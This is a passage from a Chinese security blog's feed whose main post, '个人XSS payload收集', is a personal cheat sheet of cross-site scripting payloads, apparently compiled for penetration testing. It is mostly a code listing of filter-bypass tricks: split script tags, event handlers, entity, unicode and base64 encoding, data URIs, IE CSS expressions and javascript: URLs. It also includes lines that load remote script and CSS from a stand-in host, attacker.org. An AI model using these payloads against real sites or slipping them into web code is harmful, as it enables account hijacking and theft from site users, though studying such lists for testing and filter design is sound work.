class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/195507.html" target="_blank" rel="noopener">他山之石 | 对 XSS 的一次深入分析认识</a></p><p><a href="https://www.cnblogs.com/hookjoy/p/6181350.html" target="_blank" rel="noopener">xss其他标签下的js用法总结大全</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前整理的一些可以加载XSS Payload的标签，后面还会继续更新。&lt;/p&gt;
&lt;h2 id=&quot;script标签&quot;&gt;&lt;a href=&quot;#script标签&quot; class=&quot;headerlink&quot; title=&quot;script标签&quot;&gt;&lt;/a&gt;script标签&lt;/h2&gt;&lt;p&gt;这个标
      
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>个人XSS payload收集</title>
    <link href="https://Mi1k7ea.github.com/2019/02/16/%E4%B8%AA%E4%BA%BAXSS-payload%E6%94%B6%E9%9B%86/"/>
    <id>https://Mi1k7ea.github.com/2019/02/16/个人XSS-payload收集/</id>
    <published>2019-02-16T07:58:11.000Z</published>
    <updated>2019-02-16T08:17:30.293Z</updated>
    
    <content type="html"><![CDATA[<p>这里为个人网上收集的XSS Payload，仅用于XSS攻击测试。</p><h2 id="《xss绕过，payload全集》"><a href="#《xss绕过，payload全集》" class="headerlink" title="《xss绕过，payload全集》"></a>《xss绕过，payload全集》</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line">通杀标签payload：</span><br><span class="line"><span class="tag">&lt;<span class="name">aaaa</span> <span class="attr">id</span>=<span class="string">"c"</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span> <span class="attr">tabindex</span>=<span class="string">0</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">1、script标签</span><br><span class="line">绕过进行一次移除操作：</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert("XSS")&lt;/scr&lt;script&gt;ipt&gt;</span><br><span class="line">Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">"XSS"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://attacker.org/malicious.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">1.2 JavaScript 事件</span><br><span class="line">我们可以像如下这样在元素中定义 JavaScript 事件：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">"alert('xss')"</span>&gt;</span></span><br><span class="line">这个 JavaScript 代码当有人点击它后就会被执行，同时还有其他事件如页面加载或移动鼠标都可以触发这些事件。绝大部分的时间都被过滤器所移除了，但是依旧还有少量事件没有被过滤，例如，onmouseenter 事件：<span class="tag">&lt;<span class="name">divonmouseenter="alert('xss')"</span>&gt;</span>当用户鼠标移动到 div 上时就会触发我们的代码。</span><br><span class="line">另一个绕过的办法就是在属性和= 之间插入一个空格：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span> =<span class="string">"alert('xss')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">1.3 行内样式(Inlinestyle)</span><br><span class="line">我们同样可以在行内样式里利用 IE 浏览器支持的动态特性：//IE5之后才支持</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color: expression(alert('XSS'))"</span>&gt;</span>//experssion后执行的语句相当于javascript后执行的语句</span><br><span class="line">过滤器会检查关键字 style，随后跟随的不能是 <span class="tag">&lt;<span class="name">，在随后是</span> <span class="attr">expression</span>：</span></span><br><span class="line">/style=[^&lt;]*((expression\s*?[&lt;]∗?)|(behavior\s*:))[^&lt;]*(?=\&gt;)/Uis</span><br><span class="line">所以，让我们需要把 <span class="tag">&lt; 放到其他地方：</span></span><br><span class="line">&lt;div style="color: '&lt;'; color: expression(alert('XSS'))"&gt;</span><br><span class="line"></span><br><span class="line">1.4 CSS import</span><br><span class="line">IE 浏览器支持在 CSS 中扩展 JavaScript，这种技术称为动态特性(dynamic properties)。允许攻击者加载一个外部 CSS 样式表是相当危险的，因为攻击者现在可以在原始页面中执行 JavaScript 代码了。</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">@<span class="keyword">import</span> url(<span class="string">"http://attacker.org/malicious.css"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">malicious.css：</span><br><span class="line">body &#123;</span><br><span class="line">    color: expression(alert('XSS'));</span><br><span class="line">&#125;</span><br><span class="line">为了绕过对 @import 的过滤，可以在 CSS 中使用反斜杠进行绕过：</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">@<span class="keyword">imp</span>\<span class="keyword">ort</span> url(<span class="string">"http://attacker.org/malicious.css"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">IE 浏览器会接受反斜杠，但是我们绕过了过滤器。</span><br><span class="line">    </span><br><span class="line">1.5 Javascript URL</span><br><span class="line">链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('test')"</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">上面的过滤会从代码中移除 javascript:，所以我们不能直接这么写代码。但我们可以尝试改变 javascript:的写法，使它依旧可以被浏览器执行但又不匹配正则表达式。首先来尝试下 URL 编码：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"Java&amp;#115;cript:alert('xss')"</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">上面这段代码不匹配正则表达式，但是浏览器依旧会执行它，因为浏览器会首先进行 URL 解码操作。</span><br><span class="line">另外，我们还可以使用 VBScript，虽然它在 IE11 中被禁用了，但依旧可以运行在旧版本的 IE 或者启用兼容模式的 IE11 上。我们可以使用类似上面 JavaScript 的方式来插入 VBScript 代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'vbscript:MsgBox("XSS")'</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">'-confirm`1`-'</span><br><span class="line">'-confirm(1)-'</span><br><span class="line">    </span><br><span class="line">1.6 利用字符编码</span><br><span class="line">%c1;alert(/xss/);//</span><br><span class="line"></span><br><span class="line">1.7 绕过长度限制</span><br><span class="line">"onclick=alert(1)//</span><br><span class="line">"&gt;<span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(xss);<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">1.8 使用<span class="tag">&lt;<span class="name">base</span>&gt;</span>标签</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">alert(navigator.userAgent)<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(88199)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">confirm(88199)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(88199)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006C\u0065\u0072\u0074(88199)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">+alert(88199)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/88199/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/javascript,alert(88199)</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptsrc=&amp;#100&amp;#97&amp;#116&amp;#97:text</span>/<span class="attr">javascript</span>,<span class="attr">alert</span>(<span class="attr">88199</span>)&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>,<span class="number">49</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/88199/</span>.source)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">setTimeout(alert(88199),0)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>[<span class="string">'write'</span>](<span class="number">88199</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">anytag</span> <span class="attr">onmouseover</span>=<span class="string">alert(15)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">anytag</span> <span class="attr">onclick</span>=<span class="string">alert(16)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">alert(17)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">alert(18)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(19)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>/<span class="attr">onclick</span>=<span class="string">alert(20)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span></span></span><br><span class="line"><span class="tag"><span class="attr">formaction</span>=<span class="string">javascript&amp;colon;alert(21)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>/<span class="attr">action</span>=<span class="string">javascript:alert(22)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span>/<span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(23)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(23)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(24)</span>&gt;</span> 29</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(25)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span></span></span><br><span class="line"><span class="tag"><span class="attr">onscroll</span>=<span class="string">alert(26)</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://0x.lv/xss.swf"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(document.domain)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">"javascript:alert(29);"</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0;</span></span></span><br><span class="line"><span class="tag"><span class="string">url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2%73%63%72%69%70%74%3E"</span>&gt;</span>^_^</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"javascript:alert(document.domain)"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(30)</span>&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(31)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">javascript:alert(32)</span> <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(33)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(34)</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">2.2.1 如果大小写不行的话，<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">被过滤尝试&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;；</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="xml">2.2.2使用<span class="tag">&lt;<span class="name">a</span>&gt;</span>标签测试</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">“http://www.google.com</span>"&gt;</span>Clickme<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="undefined">&lt;a被过滤？</span></span><br><span class="line"><span class="undefined">href被过滤？</span></span><br><span class="line"><span class="undefined">其他内容被过滤？</span></span><br><span class="line"><span class="undefined">如果没有过滤尝试使用</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">”javascript:alert(1)”</span>&gt;</span>Clickme<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="undefined">尝试使用错误的事件查看过滤</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"rhainfosec.com"</span><span class="attr">onclimbatree</span>=<span class="string">alert(1)</span>&gt;</span>ClickHere<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="undefined">HTML5拥有150个事件处理函数，可以多尝试其他函数</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onhashchange</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>&gt;</span>clickit</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">2.3 测试其他标签</span></span><br><span class="line"><span class="undefined">src属性</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span>      <span class="attr">onerror</span>=<span class="string">prompt(1);</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">aaa.jpg</span>      <span class="attr">onerror</span>=<span class="string">prompt(1);</span></span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span>      <span class="attr">onerror</span>=<span class="string">prompt(1);</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span>      <span class="attr">onerror</span>=<span class="string">prompt(1);</span>&gt;</span></span></span><br><span class="line"><span class="undefined">iframe</span></span><br><span class="line"><span class="javascript">&lt;iframesrc=<span class="string">"javascript:alert(2)"</span>&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">src</span>=<span class="string">"data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="</span>&gt;</span></span></span><br><span class="line"><span class="undefined">Embed</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">embed</span>/<span class="attr">src</span>=<span class="string">//goo.gl/nlX0P</span>&gt;</span></span></span><br><span class="line"><span class="undefined">Action</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"Javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">"javascript:alert(1)"</span> <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">data:text/html,</span> <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span></span><br><span class="line"><span class="undefined">mario验证</span></span><br><span class="line"><span class="javascript">&lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"pln"</span>&gt;    <span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">spanclass="tag"</span>&gt;</span>&amp;lt;formaction<span class="tag">&lt;/<span 